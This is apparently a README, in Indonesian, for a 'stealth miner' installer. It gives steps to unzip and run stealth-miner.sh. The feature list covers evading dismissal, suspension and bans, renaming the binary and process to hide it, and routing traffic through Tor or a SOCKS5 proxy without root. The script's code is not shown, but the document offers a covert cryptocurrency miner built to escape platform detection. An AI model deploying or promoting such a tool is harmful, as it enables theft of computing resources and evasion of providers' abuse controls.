# Stealth Miner Installer (with ProxyChains)

## 🛠 Cara Pakai

1. Ekstrak file ZIP ini:
   ```
   unzip stealth-miner-fixed.zip
   cd stealth-miner
   ```

2. Jadikan skrip executable:
   ```
   chmod +x stealth-miner.sh
   ```

3. Jalankan:
   ```
   ./stealth-miner.sh
   ```

## 🔐 Fitur
- Anti-dismiss, suspend, banned
- Rename binary & proses
- SOCKS5 proxy via ProxyChains (default: 127.0.0.1:9050)
- Tidak butuh root

📌 Pastikan proxy SOCKS5 aktif (Tor / SSH tunnel / lain) di 127.0.0.1:9050 sebelum menjalankan script.
